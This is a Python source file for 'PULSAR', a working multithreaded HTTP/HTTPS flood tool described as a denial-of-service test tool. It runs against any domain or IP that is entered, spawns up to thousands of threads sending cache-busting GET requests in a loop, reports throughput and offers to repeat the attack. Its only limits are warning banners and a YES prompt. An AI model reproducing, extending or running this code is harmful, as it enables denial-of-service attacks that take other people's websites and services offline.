# PULSAR.py
# Copyright (c) 2025 SALOYEK
# Licensed under the MIT License. See LICENSE file for details.

import socket
import ssl
import threading
import time
import argparse
import sys
import random
import os

# --- Set Console Title ---
def set_console_title(title_text):
    if sys.platform == "win32":
        os.system(f"title {title_text}")
    else:
        sys.stdout.write(f"\x1b]2;{title_text}\x07")
        sys.stdout.flush()

PROGRAM_NAME = "PULSAR"
STOP_KEY_INFO = "ESC TO STOP" 

try:
    import keyboard 
    KEYBOARD_AVAILABLE = True
except ImportError:
    KEYBOARD_AVAILABLE = False
    keyboard = None 

# --- Global Variables ---
stop_event = threading.Event()
packets_sent = 0
bytes_sent = 0
user_interrupted_attack = False

# --- Appearance Configuration (ANSI Colors) ---
class Colors:
    HEADER = '\033[95m'; OKBLUE = '\033[94m'; OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'; WARNING = '\033[93m'; FAIL = '\033[91m'
    ENDC = '\033[0m'; BOLD = '\033[1m'; UNDERLINE = '\033[4m'

# --- UI Elements ---
LINE_SEP_CHAR = "═"
BOX_HLINE_CHAR = "─"
BOX_VLINE_CHAR = "│"
BOX_TOP_LEFT_CHAR = "╭"
BOX_TOP_RIGHT_CHAR = "╮"
BOX_BOTTOM_LEFT_CHAR = "╰"
BOX_BOTTOM_RIGHT_CHAR = "╯"
BOX_T_DOWN_CHAR = "┬"
BOX_T_UP_CHAR = "┴"
BOX_T_LEFT_CHAR = "┤"
BOX_T_RIGHT_CHAR = "├"
BOX_CROSS_CHAR = "┼"

UI_WIDTH = 70 # Szerokość dla elementów UI

LINE_SEP = Colors.OKBLUE + LINE_SEP_CHAR * UI_WIDTH + Colors.ENDC
BOX_HLINE = Colors.OKBLUE + BOX_HLINE_CHAR * (UI_WIDTH - 2) + Colors.ENDC # -2 for corners

BANNER = f"""
{Colors.OKCYAN}{Colors.BOLD}
██████╗ ██╗   ██╗██╗     ███████╗ █████╗ ██████╗ 
██╔══██╗██║   ██║██║     ██╔════╝██╔══██╗██╔══██╗
██████╔╝██║   ██║██║     ███████╗███████║██████╔╝
██╔═══╝ ██║   ██║██║     ╚════██║██╔══██║██╔══██╗
██║     ╚██████╔╝███████╗███████║██║  ██║██║  ██║
╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
{Colors.ENDC}
       {Colors.OKGREEN}Simple Denial of Service Test Tool{Colors.ENDC}
"""
DEFAULT_THREADS_LOW_RESOURCE = 5 
DEFAULT_THREADS_NORMAL = 100

# --- Helper Functions ---
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')
    current_stop_key_info = STOP_KEY_INFO if KEYBOARD_AVAILABLE else "Ctrl+C TO STOP"
    set_console_title(f"{PROGRAM_NAME} - {current_stop_key_info}")

def print_ui_header(text, color=Colors.OKCYAN):
    print(f"\n{Colors.OKBLUE}{BOX_TOP_LEFT_CHAR}{BOX_HLINE_CHAR * (UI_WIDTH - 2)}{BOX_TOP_RIGHT_CHAR}{Colors.ENDC}")
    # Center text within the available space (UI_WIDTH - 4 for padding and vlines)
    padding_total = UI_WIDTH - 4 - len(text.replace(Colors.BOLD, "").replace(Colors.ENDC, "")) # Adjust for ANSI codes in text
    padding_left = padding_total // 2
    padding_right = padding_total - padding_left
    print(f"{Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC} {' ' * padding_left}{color}{Colors.BOLD}{text}{Colors.ENDC}{' ' * padding_right} {Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_CHAR * (UI_WIDTH - 2)}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")


def print_boxed_info(label, value, color=Colors.OKGREEN):
    # Adjust width for label, value and padding
    # Example: "│ Label:          Value                                      │"
    # Max label width around 20-25 for readability
    label_formatted = f"{color}{label:<20}{Colors.ENDC}"
    value_formatted = f"{Colors.BOLD}{value}{Colors.ENDC}"
    
    # Calculate remaining space for value after label and box characters/padding
    # 2 for vlines, 2 for spaces around label, 2 for spaces around value
    remaining_width = UI_WIDTH - 2 - 2 - len(label.replace(Colors.BOLD, "").replace(Colors.ENDC, "")) -2
    
    # Truncate value if too long, or pad
    value_display = str(value)
    if len(value_display) > remaining_width:
        value_display = value_display[:remaining_width-3] + "..."
    else:
        value_display = f"{value_display:<{remaining_width}}"


    print(f"{Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC} {label_formatted} {Colors.BOLD}{value_display}{Colors.ENDC} {Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC}")


def print_warning(text): print(f"{Colors.WARNING}│ [!] WARNING:{Colors.ENDC} {text}") # Boxed style
def print_info(text): print(f"{Colors.OKCYAN}│ [*] INFO:{Colors.ENDC} {text}")
def print_success(text): print(f"{Colors.OKGREEN}│ [+] SUCCESS:{Colors.ENDC} {text}")
def print_error(text): print(f"{Colors.FAIL}│ [X] ERROR:{Colors.ENDC} {text}")


def get_random_user_agent():
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        f"{PROGRAM_NAME} Threaded Agent/1.1" # Updated version
    ])

def format_size(num_bytes):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if abs(num_bytes) < 1024.0: return f"{num_bytes:.2f} {unit}"
        num_bytes /= 1024.0
    return f"{num_bytes:.2f} PB"

def is_valid_ip(address):
    try: socket.inet_aton(address); return True
    except socket.error: return False

# --- Main Attack Logic (Threading) ---
def attack_worker(target_ip, target_port, target_host_header, use_ssl):
    global packets_sent, bytes_sent
    path = f"/?{random.randint(1000, 99999)}"
    request_str = f"GET {path} HTTP/1.1\r\nHost: {target_host_header}\r\nUser-Agent: {get_random_user_agent()}\r\nAccept: */*\r\nConnection: close\r\n\r\n"
    request_bytes = request_str.encode('utf-8'); request_size = len(request_bytes)
    while not stop_event.is_set():
        conn = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sock.settimeout(4) 
            if use_ssl: context = ssl.create_default_context(); conn = context.wrap_socket(sock, server_hostname=target_host_header)
            else: conn = sock
            conn.connect((target_ip, target_port)); conn.sendall(request_bytes)
            packets_sent += 1; bytes_sent += request_size
        except: pass 
        finally:
            if conn:
                try: conn.shutdown(socket.SHUT_RDWR); conn.close()
                except: pass

# --- Traffic Estimation Function ---
def estimate_traffic(target_input_for_est, port, num_threads, duration):
    print_ui_header("TRAFFIC ESTIMATION", Colors.OKCYAN)
    target_ip_for_est = None; target_host_for_header_est = target_input_for_est 
    if is_valid_ip(target_input_for_est): target_ip_for_est = target_input_for_est
    else:
        try: target_ip_for_est = socket.gethostbyname(target_input_for_est)
        except socket.gaierror: print_error(f"Could not resolve domain '{target_input_for_est}' for estimation."); return 0,0
    if not target_ip_for_est: print_error("Could not determine IP for estimation."); return 0,0
    
    print_info(f"Estimating for {num_threads} threads, {duration}s duration...")
    use_ssl = (port == 443); path = f"/?{random.randint(1000, 99999)}"
    request_str = f"GET {path} HTTP/1.1\r\nHost: {target_host_for_header_est}\r\nUser-Agent: {get_random_user_agent()}\r\nConnection: close\r\n\r\n"
    single_request_size_bytes = len(request_str.encode('utf-8')); connections_per_sec_per_thread = 2.0; successful_connections = 0; total_time_for_test = 0.0
    num_test_connections = max(1, min(3, num_threads // 20 if num_threads > 0 else 1)) 
    if num_test_connections > 0:
        # print_info(f"Performing {num_test_connections} test connections...") # Less verbose
        for _ in range(num_test_connections):
            start_conn_time = time.perf_counter()
            try:
                sock_test = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sock_test.settimeout(2)
                if use_ssl: context_test = ssl.create_default_context(); conn_test = context_test.wrap_socket(sock_test, server_hostname=target_host_for_header_est)
                else: conn_test = sock_test
                conn_test.connect((target_ip_for_est, port)); conn_test.shutdown(socket.SHUT_RDWR); conn_test.close()
                end_conn_time = time.perf_counter(); total_time_for_test += (end_conn_time - start_conn_time); successful_connections += 1
            except Exception: pass 
        if successful_connections > 0:
            avg_time_per_connection = total_time_for_test / successful_connections
            if avg_time_per_connection > 0.001: connections_per_sec_per_thread = 1.0 / avg_time_per_connection
            else: connections_per_sec_per_thread = 50.0 
            print_info(f"Avg. test conn time: {avg_time_per_connection:.4f}s | Est. conn/s/thread: {connections_per_sec_per_thread:.2f}")
        else: print_warning("Failed test connections for estimation. Using default rate.")
    # else: print_info("Skipped test connections. Using default rate.")
    connections_per_sec_per_thread = min(connections_per_sec_per_thread, 100.0); connections_per_sec_per_thread = max(connections_per_sec_per_thread, 0.5)
    estimated_total_requests = num_threads * connections_per_sec_per_thread * duration; estimated_total_data_bytes = estimated_total_requests * single_request_size_bytes
    
    print_boxed_info("Req. Size (payload):", f"{single_request_size_bytes} B", Colors.OKBLUE)
    print_boxed_info("Est. Total Requests:", f"{int(estimated_total_requests)}", Colors.OKBLUE)
    print_boxed_info("Est. Outgoing Traffic:", f"{Colors.BOLD}{format_size(estimated_total_data_bytes)}{Colors.ENDC}", Colors.OKGREEN)
    print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_CHAR * (UI_WIDTH - 2)}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")
    print_warning("This is a VERY ROUGH estimate."); print_warning("Does not include protocol overhead or server responses.")
    return estimated_total_data_bytes, estimated_total_requests

# --- Interactive Input Function ---
def get_interactive_input():
    clear_console(); print(BANNER)
    print_ui_header(f"{PROGRAM_NAME} INTERACTIVE SETUP")
    current_default_threads = DEFAULT_THREADS_LOW_RESOURCE if not KEYBOARD_AVAILABLE else DEFAULT_THREADS_NORMAL
    
    def get_styled_input(prompt_main, prompt_example="", default_value_text=""):
        full_prompt = f"{Colors.OKCYAN}❯ {prompt_main}:{Colors.ENDC} "
        if prompt_example: full_prompt += f"{Colors.OKBLUE}({prompt_example}){Colors.ENDC} "
        if default_value_text: full_prompt += f"[{Colors.OKGREEN}{default_value_text}{Colors.ENDC}] "
        try: return input(full_prompt).strip()
        except KeyboardInterrupt: print_error("\nInput interrupted (Ctrl+C). Exiting."); sys.exit(1)

    target_input_val = "" 
    while not target_input_val:
        raw_target = get_styled_input("Enter target domain or IP", "e.g., example.com")
        if not raw_target: print_warning("Target cannot be empty."); continue
        if "." not in raw_target and not all(c.isdigit() for c in raw_target): print_warning("Invalid target format."); continue
        target_input_val = raw_target
    print_success(f"Target set to: {Colors.BOLD}{target_input_val}{Colors.ENDC}\n")

    target_port_val = None
    while target_port_val is None:
        raw_port = get_styled_input("Enter target port", "80, 443, empty for auto")
        if not raw_port: 
            print_info(f"Auto-detecting port for {Colors.BOLD}{target_input_val}{Colors.ENDC}...")
            try:
                print_info("Testing port 443 (HTTPS)..."); s=socket.create_connection((target_input_val,443),2);s.close()
                target_port_val=443; print_success(f"Auto-detected port: {Colors.BOLD}443 (HTTPS){Colors.ENDC}"); break
            except:
                print_warning("Port 443 failed. Testing port 80 (HTTP)...")
                try: s=socket.create_connection((target_input_val,80),2);s.close();target_port_val=80;print_success(f"Auto-detected port: {Colors.BOLD}80 (HTTP){Colors.ENDC}");break
                except: print_error("Auto-detection failed. Please specify port."); continue
        else:
            try:
                port_val_int = int(raw_port)
                if port_val_int not in [80, 443]: print_warning("Invalid port (80/443)."); continue
                target_port_val = port_val_int
                print_success(f"Port set to: {Colors.BOLD}{target_port_val}{Colors.ENDC}\n")
            except ValueError: print_warning("Not a valid port number.")
    
    duration_val = None
    while duration_val is None:
        raw_duration = get_styled_input("Enter duration (seconds)", "default: 60")
        if not raw_duration: duration_val = 60; print_success(f"Duration set to default: {Colors.BOLD}60s{Colors.ENDC}\n"); break
        try:
            duration_val_int = int(raw_duration)
            if duration_val_int <= 0: print_warning("Duration must be > 0."); continue
            duration_val = duration_val_int
            print_success(f"Duration set to: {Colors.BOLD}{duration_val}s{Colors.ENDC}\n")
        except ValueError: print_warning("Not a valid number.")

    num_threads_val = None
    while num_threads_val is None:
        raw_threads = get_styled_input("Enter number of threads", f"default: {current_default_threads}")
        if not raw_threads: num_threads_val = current_default_threads; print_success(f"Threads set to default: {Colors.BOLD}{current_default_threads}{Colors.ENDC}\n"); break
        try:
            threads_val_int = int(raw_threads)
            if threads_val_int <= 0: print_warning("Threads must be > 0."); continue
            if threads_val_int > 5000: print_warning(f"Threads ({threads_val_int}) EXTREMELY high!")
            elif threads_val_int > 2000 and KEYBOARD_AVAILABLE: print_warning(f"Threads ({threads_val_int}) very high.")
            elif threads_val_int > 50 and not KEYBOARD_AVAILABLE: print_warning(f"Threads ({threads_val_int}) high for no-ESC.")
            num_threads_val = threads_val_int
            print_success(f"Threads set to: {Colors.BOLD}{num_threads_val}{Colors.ENDC}\n")
        except ValueError: print_warning("Not a valid number.")
            
    return target_input_val, target_port_val, duration_val, num_threads_val

# --- ESC Key Press Callback ---
def esc_listener_thread_func():
    global user_interrupted_attack, stop_event
    if KEYBOARD_AVAILABLE and keyboard:
        try:
            keyboard.wait('esc', suppress=True) 
            if not stop_event.is_set():
                sys.stdout.write(f"\r{Colors.WARNING}{Colors.BOLD}ESC key detected!{Colors.ENDC} Stopping attack...                                        \n"); sys.stdout.flush()
                user_interrupted_attack = True; stop_event.set()
        except: pass

# --- Attack Execution Function ---
def run_attack(target_input_val, target_port_val, duration_val, num_threads_val):
    global packets_sent, bytes_sent, stop_event, user_interrupted_attack
    packets_sent = 0; bytes_sent = 0; stop_event.clear(); user_interrupted_attack = False
    current_stop_key = STOP_KEY_INFO if KEYBOARD_AVAILABLE else "Ctrl+C TO STOP"
    current_attack_title = f"{PROGRAM_NAME} - Attacking {target_input_val}:{target_port_val} - {current_stop_key}"
    set_console_title(current_attack_title)

    print_ui_header("ATTACK CONFIGURATION", Colors.OKGREEN)
    print_boxed_info("Target:", target_input_val, Colors.OKBLUE)
    print_boxed_info("Port:", str(target_port_val), Colors.OKBLUE)
    print_boxed_info("Duration:", f"{duration_val} seconds", Colors.OKBLUE)
    print_boxed_info("Threads:", str(num_threads_val), Colors.OKBLUE)
    print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_CHAR * (UI_WIDTH-2)}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}\n")


    target_ip_to_connect = None; target_host_for_header = target_input_val
    if is_valid_ip(target_input_val): target_ip_to_connect = target_input_val; print_info(f"Target '{target_input_val}' is an IP address.")
    else:
        print_info(f"Target '{target_input_val}' is a domain. Resolving...");
        try: target_ip_to_connect = socket.gethostbyname(target_input_val); print_success(f"Resolved to IP: {target_ip_to_connect}")
        except socket.gaierror as e: print_error(f"Could not resolve domain '{target_input_val}': {e}"); set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); return False 
    if not target_ip_to_connect: print_error("Could not determine IP address for connection."); set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); return False

    estimate_traffic(target_input_val, target_port_val, num_threads_val, duration_val)

    try:
        confirm = input(f"{Colors.WARNING}│ [?] START ATTACK?{Colors.ENDC} ({Colors.OKGREEN}YES{Colors.ENDC}/{Colors.FAIL}NO{Colors.ENDC}): ").strip().upper()
        if confirm != 'YES': print_info("Attack start cancelled."); set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); return "cancelled"
    except KeyboardInterrupt: print_error("\nInput interrupted (Ctrl+C). Exiting program."); sys.exit(1)
    
    use_ssl = (target_port_val == 443); 
    print_ui_header("ATTACK IN PROGRESS", Colors.FAIL) # Red header for attack
    print_info(f"Attacking {Colors.BOLD}{target_ip_to_connect}:{target_port_val}{Colors.ENDC} for {Colors.BOLD}{duration_val}{Colors.ENDC}s...")
    listener_thread_obj = None
    if KEYBOARD_AVAILABLE: 
        print_info(f"Press {Colors.BOLD}ESC{Colors.ENDC} to stop early.")
        listener_thread_obj = threading.Thread(target=esc_listener_thread_func, daemon=True); listener_thread_obj.start()
    else: print_info(f"Press {Colors.BOLD}Ctrl+C{Colors.ENDC} to stop attack (ESC disabled).")
    
    threads_list = []; start_time = time.perf_counter()
    for _ in range(num_threads_val):
        thread = threading.Thread(target=attack_worker, args=(target_ip_to_connect, target_port_val, target_host_for_header, use_ssl))
        threads_list.append(thread); thread.daemon = True; thread.start()
    try:
        progress_bar_length = UI_WIDTH - 50 # Adjust progress bar length
        if progress_bar_length < 10 : progress_bar_length = 10

        while True:
            elapsed_time = time.perf_counter() - start_time
            if elapsed_time >= duration_val or stop_event.is_set(): break 
            current_bytes = bytes_sent; current_packets = packets_sent
            bytes_per_sec = current_bytes / elapsed_time if elapsed_time > 0 else 0
            packets_per_sec = current_packets / elapsed_time if elapsed_time > 0 else 0
            progress = min(1.0, elapsed_time / duration_val); filled_length = int(progress_bar_length * progress)
            bar = '█' * filled_length + '-' * (progress_bar_length - filled_length)
            
            # Construct status line carefully to fit and look good
            time_str = f"{elapsed_time:.1f}s/{duration_val}s"
            sent_str = f"Sent: {format_size(current_bytes)} ({current_packets} pkts)"
            speed_str = f"Speed: {format_size(bytes_per_sec)}/s ({packets_per_sec:.0f} pps)"
            
            # Calculate padding for centering bar and text
            bar_text = f"{Colors.OKCYAN}Progress{Colors.ENDC}: [{Colors.OKGREEN}{bar}{Colors.ENDC}] {progress*100:.1f}%"
            remaining_width_for_stats = UI_WIDTH - len(bar_text.replace(Colors.OKCYAN,"").replace(Colors.ENDC,"").replace(Colors.OKGREEN,"")) -5 # -5 for \r and spaces
            
            stats_str = f"{time_str} | {sent_str} | {speed_str}"
            if len(stats_str) > remaining_width_for_stats: # Truncate stats if too long
                stats_str = f"{time_str} | {sent_str[:15]}... | {speed_str[:15]}..."


            status_line = f"\r{bar_text} | {stats_str}"
            # Pad with spaces to clear previous longer lines
            status_line += ' ' * (UI_WIDTH - len(status_line.replace(Colors.OKCYAN,"").replace(Colors.ENDC,"").replace(Colors.OKGREEN,"").replace(Colors.BOLD,"")) ) 
            
            sys.stdout.write(status_line); sys.stdout.flush(); time.sleep(0.1)
            
        if not stop_event.is_set() and not user_interrupted_attack: sys.stdout.write("\n"); print_info("Test duration elapsed.")
    except KeyboardInterrupt:
        if not KEYBOARD_AVAILABLE or not listener_thread_obj or not listener_thread_obj.is_alive():
            sys.stdout.write("\n"); print_warning("\nAttack interrupted (Ctrl+C)... Stopping."); user_interrupted_attack = True
            if not stop_event.is_set(): stop_event.set()
        else: sys.stdout.write("\n"); print_warning(f"\n(Ctrl+C during attack. Press {Colors.BOLD}ESC{Colors.ENDC} to stop.)"); pass 
    finally:
        set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); sys.stdout.write("\n"); sys.stdout.flush()
        if not stop_event.is_set(): stop_event.set()
        print_info("Waiting for threads to finish..."); time.sleep(0.5)
        
        final_elapsed_time = time.perf_counter() - start_time
        print_ui_header("ATTACK RESULTS", Colors.OKGREEN) # Green header for results
        print_boxed_info("Actual Duration:", f"{final_elapsed_time:.2f} seconds", Colors.OKBLUE)
        print_boxed_info("Requests Sent:", str(packets_sent), Colors.OKBLUE)
        print_boxed_info("Data Sent:", format_size(bytes_sent), Colors.OKBLUE)
        if final_elapsed_time > 0:
            avg_bps = bytes_sent / final_elapsed_time; avg_pps = packets_sent / final_elapsed_time
            print_boxed_info("Average Speed:", f"{format_size(avg_bps)}/s ({avg_pps:.0f} pps)", Colors.OKBLUE)
        if user_interrupted_attack: 
            interrupt_method = "ESC" if (KEYBOARD_AVAILABLE and listener_thread_obj and not listener_thread_obj.is_alive()) else "Ctrl+C"
            print_warning(f"Attack was interrupted by user {interrupt_method}.")
        print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_CHAR * (UI_WIDTH-2)}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}\n")
        print_success(f"--- {Colors.BOLD}{PROGRAM_NAME} Attack Finished{Colors.ENDC} ---")
    return True

# --- Main Function ---
def main():
    is_color_supported = sys.stdout.isatty()
    if sys.platform == "win32":
        try: import ctypes; kernel32 = ctypes.windll.kernel32; kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7); is_color_supported = True
        except: is_color_supported = False 
    if not is_color_supported:
        for attr in dir(Colors):
            if attr.isupper(): setattr(Colors, attr, "")
    if not KEYBOARD_AVAILABLE:
        print(f"{Colors.WARNING}[!] Lib 'keyboard' not installed. ESC disabled.{Colors.ENDC}")
        print(f"{Colors.WARNING}Install: pip install keyboard. Use Ctrl+C to stop attack.{Colors.ENDC}")
        try: input(f"{Colors.OKGREEN}Press Enter to continue...{Colors.ENDC}")
        except KeyboardInterrupt: print_error("\nExiting."); sys.exit(1)
    clear_console(); print(BANNER)
    print_warning("USE RESPONSIBLY AND ONLY ON YOUR OWN SYSTEMS!"); print_warning("Misuse is ILLEGAL.")
    parser = argparse.ArgumentParser(description=f"{Colors.BOLD}{PROGRAM_NAME}{Colors.ENDC} - DoS Test Tool.", epilog="Use responsibly!", formatter_class=argparse.RawTextHelpFormatter )
    parser.add_argument("target", nargs='?', help="Target domain or IP"); parser.add_argument("port", nargs='?', type=int, help="Port (80, 443)")
    parser.add_argument("duration", nargs='?', type=int, help="Duration (s)"); parser.add_argument("-t", "--threads", type=int, default=None, help="Number of threads")
    parser.add_argument("-i", "--interactive", action="store_true", help="Interactive mode")
    args = parser.parse_args()
    last_target = None; last_port = None; last_duration = None; last_threads = None
    cli_args_processed = False; get_new_params = True
    while True: 
        if get_new_params:
            if not cli_args_processed and not args.interactive and args.target and args.port is not None and args.duration is not None:
                print_info("Using CLI parameters..."); target, port, duration = args.target, args.port, args.duration
                threads = args.threads if args.threads and args.threads > 0 else (DEFAULT_THREADS_LOW_RESOURCE if not KEYBOARD_AVAILABLE else DEFAULT_THREADS_NORMAL)
                if threads > 5000: print_warning(f"CLI Threads ({threads}) EXTREMELY high...")
                elif threads > 2000 and KEYBOARD_AVAILABLE: print_warning(f"CLI Threads ({threads}) very high...")
                elif threads > 50 and not KEYBOARD_AVAILABLE: print_warning(f"CLI Threads ({threads}) high for no-ESC env.")
                last_target, last_port, last_duration, last_threads = target, port, duration, threads
                cli_args_processed = True
            else:
                if last_target and get_new_params : clear_console(); print(BANNER) 
                target, port, duration, threads = get_interactive_input()
                last_target, last_port, last_duration, last_threads = target, port, duration, threads
        get_new_params = True 
        attack_result = run_attack(last_target, last_port, last_duration, last_threads)
        if attack_result == "cancelled": pass
        while True:
            print_ui_header("WHAT NEXT?", Colors.OKGREEN)
            menu_options = [
                f"Repeat last attack ({Colors.BOLD}{last_target}:{last_port}{Colors.ENDC}, {last_threads} thr)",
                "Start a new attack (new settings)",
                "Close program"
            ]
            for i, option in enumerate(menu_options):
                print(f"{Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC} {Colors.OKCYAN}[{i+1}]{Colors.ENDC} {option.ljust(UI_WIDTH - 8)} {Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC}")
            print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_CHAR * (UI_WIDTH-2)}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")

            try:
                choice = input(f"{Colors.OKGREEN}❯ Your choice (1-3): {Colors.ENDC}").strip()
                if choice == '1': clear_console(); print(BANNER); get_new_params = False; break 
                elif choice == '2': get_new_params = True; break 
                elif choice == '3': print_info(f"Thank you for using {Colors.BOLD}{PROGRAM_NAME}{Colors.ENDC}. Closing..."); sys.exit(0)
                else: print_warning("Invalid choice.")
            except KeyboardInterrupt: print_error("\nInput interrupted (Ctrl+C). Exiting program."); sys.exit(1)
        
if __name__ == "__main__":
    try: main()
    except SystemExit: pass
    except Exception as e: print_error(f"Unexpected global error: {type(e).__name__} - {e}")
    finally:
        if KEYBOARD_AVAILABLE and keyboard:
            try: keyboard.unhook_all() 
            except: pass
        current_stop_key = STOP_KEY_INFO if KEYBOARD_AVAILABLE else "Console"
        if sys.platform == "win32": os.system(f"title {current_stop_key}") 
        else: sys.stdout.write(f"\x1b]2;{current_stop_key}\x07"); sys.stdout.flush()
        print(Colors.ENDC)
